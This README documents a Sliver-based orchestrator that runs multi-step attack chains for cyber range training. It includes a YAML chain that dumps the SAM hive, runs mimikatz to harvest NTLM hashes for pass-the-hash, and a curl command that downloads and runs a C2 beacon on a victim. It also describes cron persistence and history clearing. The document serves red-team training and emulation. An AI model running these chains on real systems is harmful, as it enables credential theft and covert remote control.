# Sliver Scenario Orchestrator

A service wrapper on top of Sliver's gRPC API that supports building and executing multi-stage attack chains for cyber range training. Chains are directed acyclic graphs (DAGs) of steps, where steps can forward their output to later steps and gate execution on conditions.

**Repo root** in this README means the `scenario/` directory. In the Sliver monorepo, run Docker and helper scripts from `scenario/`.

## Quick Start

### 1. Prepare `sliver-orchestrator-workspace`

The Docker lab mounts atomics from `sliver-orchestrator-workspace/atomics`. If `sliver-orchestrator-workspace` is tracked as a git submodule, initialize it instead of downloading atomics manually.

```bash
git submodule update --init --recursive sliver-orchestrator-workspace
```

### 2. Start the lab

```bash
docker-compose -f lab/docker-compose.yml up --build -d
docker-compose logs -f c2
```

The compose stack exposes:
- `http://127.0.0.1:18080` — Scenario REST API
- `127.0.0.1:31337` — Sliver gRPC

### 3. Build the runner

From the Sliver repo root:

```bash
make scenario-runner
```

### 4. Run the example chain

If you are in the Sliver monorepo root, use:

```bash
./scenario-runner -chain scenario/examples/linux-full-chain.yaml -graph -online-print
```

If you already have `scenario-runner` in the current directory, use:

```bash
./scenario-runner -chain examples/linux-full-chain.yaml -graph -online-print
```

If you are inside `scenario/` in the Sliver monorepo, use:

```bash
../scenario-runner -chain examples/linux-full-chain.yaml -graph -online-print
```

### 5. Check the API

```bash
curl http://127.0.0.1:18080/api/v1/health
curl http://127.0.0.1:18080/api/v1/atomics | jq .
curl http://127.0.0.1:18080/api/v1/sessions | jq .
```

## Lab Setup

### Docker

What starts automatically:

1. The `c2` container starts `sliver-server`, generates an operator config, and runs `scenario-server`.
2. The victim polls `GET /api/v1/health` until the API is ready, then downloads the Linux implant from `GET /api/v1/implant/linux`.
3. On the first implant request, `scenario-server` starts a Sliver HTTP listener on port `80` and builds a Linux beacon.
4. When the victim checks in, it appears in `GET /api/v1/sessions`.

Useful commands:

```bash
docker-compose -f lab/docker-compose.yml up --build -d
docker-compose logs -f c2
docker-compose logs -f victim-1
docker-compose down -v
```

## Atomics Library

Technique definitions use the [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) layout: `T1059.001/T1059.001.yaml`. The loader accepts both `.yaml` and `.yml` and scans subdirectories under the atomics root.

Preferred setup:

```bash
git submodule update --init --recursive sliver-orchestrator-workspace
```

The Docker lab reads atomics from `sliver-orchestrator-workspace/atomics`.

If you want to populate that directory without the submodule:

```bash
mkdir -p sliver-orchestrator-workspace/atomics
chmod +x atomic/fetch.sh
./atomic/fetch.sh ./sliver-orchestrator-workspace/atomics
```

Optional cleanup after download:

```bash
./atomic/fetch.sh ./sliver-orchestrator-workspace/atomics --clean
```

`atomic/fetch.sh` downloads the GitHub archive and copies only the upstream `atomics/` tree. It does not install `Invoke-AtomicRedTeam` or PowerShell helper scripts.

For local execution on the C2 host, you can use [GoART](https://github.com/lcensies/go-atomicredteam):

```bash
go install github.com/lcensies/go-atomicredteam/cmd/goart@latest
goart --technique T1059.001 --index 0 --atomics-path ./sliver-orchestrator-workspace/atomics
```

## Building

From the Sliver repo root:

```bash
make scenario          # build scenario-server
make scenario-runner   # build scenario-runner
```

## Chain YAML Schema

```yaml
id: lateral-movement-demo          # unique chain ID
name: "Pass-the-Hash Demo"
description: "Dump creds then move laterally"
mitre_tactics: [credential-access, lateral-movement]
tags: [demo, windows]

steps:
  - id: dump_sam                   # unique step ID within the chain
    name: "Dump SAM hive"
    action:
      type: command                # command | atomic | upload | binary | sliver_rpc
      command:
        interpreter: powershell    # sh | bash | powershell | cmd
        cmd: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y"
    output_var: dump_stdout        # capture stdout → {{dump_stdout}} for later steps
    timeout: "60s"
    on_fail: abort                 # abort | continue | continue_no_err | skip_dependents

  - id: run_mimikatz
    depends_on: [dump_sam]
    action:
      type: binary
      binary:
        url: "http://192.168.56.10:8888/mimikatz.exe"  # C2 downloads then uploads
        remote_path: "C:\\Windows\\Temp\\mimi.exe"
        args: "privilege::debug sekurlsa::logonpasswords exit"
        platform: windows
        cleanup: true              # remove after execution
    # Extract NTLM hash and username into separate variables
    output_extract:
      - var: ntlm_hash
        regex: "NTLM\\s*:\\s*([0-9a-fA-F]{32})"
        group: 1
      - var: cred_user
        regex: "Username\\s*:\\s*(\\S+)"
        group: 1

  - id: extract_hash
    depends_on: [dump_sam]
    conditions:
      - dump_stdout|contains: "The operation completed successfully"
    action:
      type: atomic                 # delegates to atomic library
      atomic_ref:
        id: T1003.002              # technique ID
        test: 0                    # zero-based test index (or use name/guid)
        name: ""                   # alternative: exact test name
        guid: ""                   # alternative: auto_generated_guid
        args:                      # override input_arguments defaults
          output_dir: "C:\\Windows\\Temp"

  - id: pass_the_hash
    depends_on: [run_mimikatz]
    action:
      type: atomic
      atomic_ref:
        id: T1550.002
        test: 0
        args:
          ntlm_hash: "{{ntlm_hash}}"   # {{VarName}} substitution from prior output_extract
          username:  "{{cred_user}}"

  - id: discovery
    # no depends_on → runs in parallel with pass_the_hash once dump_sam completes
    action:
      type: atomic
      atomic_ref: { id: T1082, test: 0 }
```

### Action types

| Type | Description |
|---|---|
| `command` | Raw command via `interpreter` (sh/bash/powershell/cmd) |
| `atomic` | Resolves a technique from `atomics/` and executes it as a command |
| `upload` | Copies a file from a C2-server path to `remote_path` on the session |
| `binary` | Fetches a binary (embedded base64 `data` or `url`), uploads to victim, executes |
| `sliver_rpc` | Named Sliver RPC call (Ps, Screenshot, Ifconfig, Netstat) |

#### `binary` action fields

| Field | Description |
|---|---|
| `data` | Base64-encoded binary payload (embedded in the chain definition) |
| `url` | URL the C2 server downloads the binary from before uploading |
| `remote_path` | Destination on the victim (auto-generated temp path if omitted) |
| `args` | Arguments appended when executing the binary |
| `platform` | `linux` (default) or `windows` — controls chmod, delete commands |
| `cleanup` | If `true`, remove the binary from the victim after execution |

Exactly one of `data` or `url` must be set.

#### `probe` action fields

Runs a platform-appropriate command on the victim via Sliver and optionally validates the result. When `match` is set, exit 0 = match (continue), exit 1 = no match (triggers `on_fail`). Without `match`, always exits 0 — useful for pure discovery/capture.

| Field | Description |
|---|---|
| `kind` | What to probe: `os`, `kernel`, `arch`, `software_exists`, `software_version` |
| `software` | Program name (required for `software_exists` / `software_version`) |
| `match` | Go regex; step exits 1 if stdout doesn't match. Supports `{{VarName}}` |
| `platform` | `linux` (default), `windows`, or `darwin` — selects the detection command |

| Kind | Linux/macOS command | Windows command |
|---|---|---|
| `os` | `uname -s` | `wmic os get Caption /value` |
| `kernel` | `uname -r` | `wmic os get Version /value` |
| `arch` | `uname -m` | `wmic os get OSArchitecture /value` |
| `software_exists` | `which <software>` | `where <software>` |
| `software_version` | `<sw> --version \|\| <sw> -version \|\| <sw> version` | `<sw> --version` |

#### `python` action fields

Executes a Python 3 script **on the C2 server** (not on the victim). Scripts can use [sliver-py](https://github.com/sliverarmory/sliver-py) for full Sliver interaction, or any library installed on the C2 host. stdout/stderr/exit-code are treated as the step's output.

| Field | Description |
|---|---|
| `script` | Path to a `.py` file on the C2 server filesystem |
| `inline` | Inline Python source (written to a temp file before execution) |
| `args` | Extra CLI arguments appended after the script path. Supports `{{VarName}}` |
| `env` | Extra environment variables for the script. Values support `{{VarName}}` |

Built-in env vars always injected:
- `SLIVER_CONFIG` — path to the Sliver operator `.cfg` file (for `sliver-py`)
- `SESSION_ID` — the current target session ID

Exactly one of `script` or `inline` must be set.

#### Probe + Python example

```yaml
steps:
  # ── Environment checks ─────────────────────────────────────────────────────
  - id: check_os
    name: "Detect victim OS"
    action:
      type: probe
      probe:
        kind: os
        platform: linux      # use "windows" for Windows targets
    output_var: victim_os    # captures "Linux" / "Darwin" / etc.

  - id: check_kernel
    depends_on: [check_os]
    conditions:
      - victim_os|contains: Linux
    action:
      type: probe
      probe:
        kind: kernel
        platform: linux
        match: "^5\\..*"     # require kernel >= 5.x (regex match)
    output_var: kernel_ver
    on_fail: abort           # stop chain if kernel too old

  - id: check_python3
    depends_on: [check_os]
    action:
      type: probe
      probe:
        kind: software_exists
        software: python3
        platform: linux

  - id: check_curl_version
    depends_on: [check_os]
    action:
      type: probe
      probe:
        kind: software_version
        software: curl
        platform: linux
    output_var: curl_ver

  # ── Custom Python step using sliver-py ──────────────────────────────────────
  - id: custom_recon
    depends_on: [check_os]
    action:
      type: python
      python:
        script: /opt/scenarios/scripts/recon.py
        env:
          TARGET_HOSTNAME: "{{hostname}}"   # forward captured var to script
    output_var: recon_result
    output_extract:
      - var: open_port
        regex: "OPEN:(\\d+)"
        group: 1

  - id: inline_check
    action:
      type: python
      python:
        inline: |
          import os, sys
          session_id = os.environ["SESSION_ID"]
          print(f"Running against session: {session_id}")
          sys.exit(0)
```

A minimal `sliver-py` script (`/opt/scenarios/scripts/recon.py`):

```python
import asyncio, os, sys
from sliver import SliverClientConfig, SliverClient

async def main():
    cfg = SliverClientConfig.parse_config_file(os.environ["SLIVER_CONFIG"])
    client = SliverClient(cfg)
    await client.connect()
    session_id = os.environ["SESSION_ID"]
    interact = await client.interact_session(session_id)
    ls = await interact.ls("/tmp")
    for entry in ls.Files:
        print(entry.Name)

asyncio.run(main())
```

### Output variable passing

Steps forward data to later steps through named variables referenced as `{{VarName}}`.

| Field | Description |
|---|---|
| `output_var` | Capture full stdout as a named variable |
| `output_filter` | When set alongside `output_var`, extract a regex capture group instead of full stdout |
| `output_extract` | List of `{var, regex, group}` — extract multiple named variables from stdout |

`{{VarName}}` is substituted in `command.cmd`, `binary.url`, `binary.remote_path`, `binary.args`, `upload.local_path`, `upload.remote_path`, `atomic_ref.args.*`, and `sliver_rpc.params.*`.

```yaml
  - id: recon
    action:
      type: command
      command:
        interpreter: sh
        cmd: "ip route | head -5"
    output_var: route_raw               # full stdout → {{route_raw}}
    output_filter:
      regex: "default via ([\d.]+)"    # extract just the gateway IP
      group: 1                          # capture group 1 (1-based, default 1)
    # output_var now stores the extracted gateway IP, not the full route output

  - id: multi_extract
    action:
      type: command
      command:
        interpreter: sh
        cmd: "id && hostname"
    output_extract:                     # pull multiple vars from one step
      - var: uid
        regex: "uid=(\\d+)"
        group: 1
      - var: hostname
        regex: "^(\\S+)$"
        group: 1
```

### Condition operators

| Op | Description |
|---|---|
| `eq` / `neq` | Exact string equality |
| `contains` | Substring match |
| `matches` | Go regexp match |
| `gt` / `lt` | Numeric comparison (for exit_code or numeric output) |

Set `negate: true` to invert any condition.

Conditions can be written in two ways:

- **Explicit:** `var`, `op`, `value` (and optional `negate`).
- **Sigma-style:** a single key `var|op` with the value, e.g. `victim_os|contains: Linux` or `exit_code|eq: "0"`.

### Fail policies

| `on_fail` | Behaviour |
|---|---|
| `continue` | Log failure, continue other steps (default). Step counts as failed; chain reports failure at end if any step failed. |
| `continue_no_err` | Same as continue, but this step’s failure does **not** cause the chain to be reported as failed. Use for optional/non-critical steps. |
| `abort` | Stop the entire chain immediately |
| `skip_dependents` | Skip all steps that (transitively) depend on this one |

## REST API Reference

All endpoints are under `/api/v1/`.

### Health

```
GET /health
```

### Sessions (Sliver proxy)

```
GET /sessions
```
Returns active Sliver sessions: `[{id, name, os, hostname, username, pid}]`

### Implant delivery

```
GET /implant/linux?arch=amd64&c2=172.20.0.10&port=80
```

On the first call, the server:
1. Starts a Sliver HTTP listener on `c2:port` (idempotent — skips if one is already running).
2. Compiles a Linux beacon implant via the Sliver gRPC API (~1–2 min).
3. Caches the binary in-process; subsequent calls return it instantly.

Returns the ELF binary as `application/octet-stream`.

| Query param | Default | Description |
|---|---|---|
| `arch` | `amd64` | Target architecture: `amd64` or `arm64` |
| `c2` | `C2_HOST` env or `172.20.0.10` | C2 callback address for the beacon |
| `port` | `80` | HTTP listener port on the C2 |

The victim entrypoint calls this automatically:
```bash
curl http://172.20.0.10:8080/api/v1/implant/linux -o /usr/local/bin/sliver-beacon
chmod +x /usr/local/bin/sliver-beacon && /usr/local/bin/sliver-beacon &
```

### Atomics

```
GET /atomics?tactic=execution&platform=windows
GET /atomics/{technique_id}      e.g. /atomics/T1059.001
```

### Chains

```
POST   /chains                   body: Chain JSON
GET    /chains
GET    /chains/{id}
PUT    /chains/{id}
DELETE /chains/{id}
POST   /chains/{id}/execute      body: {"session_id": "...", "dry_run": false}
```

`execute` returns `{"execution_id": "..."}` immediately and runs the chain asynchronously.

`dry_run: true` validates the DAG and returns the resolved step order without executing.

### Executions

```
GET  /executions?chain_id={id}   list executions (optionally filtered by chain)
GET  /executions/{id}            status + all step logs
GET  /executions/{id}/stream     SSE live event stream
POST /executions/{id}/cancel
```

#### SSE event types

| Event | Payload |
|---|---|
| `step_start` | `{step_id}` |
| `step_done` | `{step_id, stdout, stderr, exit_code, duration_ms}` |
| `step_failed` | `{step_id, stdout, stderr, exit_code, error, duration_ms}` |
| `step_skipped` | `{step_id, message}` |
| `step_log` | Replay of a stored step log (sent first on stream connect) |
| `chain_done` | `{message}` |
| `chain_failed` | `{message}` |
| `done` | Stream close signal |

#### Example: stream an execution

```bash
EXEC_ID=$(curl -s -X POST http://localhost:8080/api/v1/chains/my-chain-id/execute \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"abc123"}' | jq -r .execution_id)

curl -N http://localhost:8080/api/v1/executions/${EXEC_ID}/stream
```

## Configuration

Priority: CLI flags > `SCENARIO_*` env vars > YAML file > defaults.

| Flag | Env var | Default | Description |
|---|---|---|---|
| `--config` | `SCENARIO_SLIVER_CONFIG` | required | Sliver operator `.cfg` file path |
| `--atomics` | `SCENARIO_ATOMICS_DIR` | `./atomics` | Technique YAML directory |
| `--db` | `SCENARIO_DB_PATH` | `./scenario.db` | SQLite database path |
| `--listen` | `SCENARIO_LISTEN` | `:8080` | HTTP listen address |
| `--allow-origin` | `SCENARIO_ALLOW_ORIGIN` | `*` | CORS Allow-Origin |
| *(n/a)* | `SCENARIO_C2_HOST` / `C2_HOST` | `172.20.0.10` | Beacon callback address for `GET /implant/linux` |

Optional YAML config file:

```yaml
sliver_config: /etc/sliver/scenario-operator.cfg
atomics_dir:   /opt/atomics
db_path:       /var/lib/scenario/scenario.db
listen:        :8080
allow_origin:  "*"
c2_host:       172.20.0.10   # address beacons call back to (GET /implant/linux)
log_level:     info
```

## Project Structure

Repo root = this directory (scenario/ in sliver monorepo, or the repo root when standalone).

```
.                    Go packages (cmd, api, chain, atomic, sliver, store, config)
├── cmd/server/      HTTP server entrypoint (main.go)
├── config/          Config loading (YAML + env)
├── chain/           Chain model, DAG resolver, condition evaluator, executor
├── atomic/          Fetch helper for upstream Atomic Red Team YAMLs
│   └── fetch.sh     Downloads upstream atomics into a local directory
├── sliver/          Sliver gRPC client + step executor
├── store/           SQLite persistence (GORM)
└── api/             REST API handlers (Go 1.22 ServeMux)

sliver-orchestrator-workspace/atomics/   Mounted Atomic Red Team YAML library
└── T*/T*.yaml       Upstream technique definitions used by the Docker lab

lab/
├── docker-compose.yml   Docker lab (c2 + 2 linux victims)
├── Dockerfile.victim    Victim container image
└── provision/       Shell + PowerShell provisioning scripts

Dockerfile          C2 container image (multi-stage: scenario-server + runtime), at repo root

examples/            Ready-to-use chain YAML files
├── t1082-basic-discovery.yaml   Single atomic test (beginner)
├── linux-full-chain.yaml        Full post-exploitation chain (advanced)
└── run.sh                       Helper script: load + execute + stream results
```

## Examples

The `examples/` directory contains ready-to-use chain definitions in YAML.
The API accepts both JSON and YAML (`Content-Type: application/yaml`).

### Example 1 — Single Atomic Test (`t1082-basic-discovery.yaml`)

The simplest possible chain: one step, one Atomic Red Team test.
Good for verifying that the lab is working end-to-end.

**MITRE:** T1082 – System Information Discovery

```yaml
steps:
  - id: sysinfo
    name: "System Information Discovery"
    action:
      type: atomic
      atomic_ref:
        id: T1082
        test: 0          # "System info enumeration (Linux)"
    output_var: sysinfo_out
    timeout: "30s"
```

### Example 2 — Full Linux Post-Exploitation Chain (`linux-full-chain.yaml`)

A realistic multi-phase attack chain covering four tactics:

| Phase | Steps | Techniques |
|---|---|---|
| 1 — Probe | `check_os`, `check_kernel` | Probe |
| 2 — Discovery | `sysinfo`, `account_discovery`, `net_config`, `net_connections`, `file_discovery` | T1082, T1087, T1016, T1049, T1083 |
| 3 — Persistence | `check_crontab`, `cron_persistence` | T1059.004 |
| 4 — Evasion | `clear_history` | T1070.001 |

Demonstrates:
- **Parallel execution** — all Phase 2 steps share `depends_on: [check_os]` so they run concurrently
- **Conditions** — sigma-style (e.g. `victim_os|contains: Linux`) gates Linux-only steps
- **`skip_dependents`** — cron persistence silently skips if crontab is missing
- **Output capture** — `output_var` stores stdout for later `{{VarName}}` substitution

### Running examples with `run.sh`

```bash
# Start the lab first (if not already running)
docker-compose -f lab/docker-compose.yml up --build -d

# Example 1 — basic atomic test
./examples/run.sh examples/t1082-basic-discovery.yaml

# Example 2 — full attack chain
./examples/run.sh examples/linux-full-chain.yaml
```

The script:
1. Checks API health
2. Auto-selects the first active session
3. POSTs the YAML chain definition
4. Dry-runs to validate the DAG
5. Executes and streams results live with step-by-step output

**Manual equivalent (curl + jq):**

```bash
API=http://127.0.0.1:18080/api/v1
SESSION=$(curl -s $API/sessions | jq -r '.[0].id')

# Load the chain (YAML accepted)
CHAIN_ID=$(curl -s -X POST $API/chains \
  -H 'Content-Type: application/yaml' \
  --data-binary @examples/t1082-basic-discovery.yaml | jq -r .id)

# Execute
EXEC_ID=$(curl -s -X POST $API/chains/$CHAIN_ID/execute \
  -H 'Content-Type: application/json' \
  -d "{\"session_id\":\"$SESSION\"}" | jq -r .execution_id)

# Stream results
curl -N $API/executions/$EXEC_ID/stream
```

## Building and moving the package out

The scenario packages live inside the Sliver Go module for convenience (shared vendored deps). To use as a standalone repo, copy this directory (scenario/) as the new repo root:

```bash
cp -r scenario/ /path/to/standalone/
cd /path/to/standalone
# Add go.mod at root, add explicit requires for grpc/gorm/yaml/protobuf, then:
go mod tidy
```
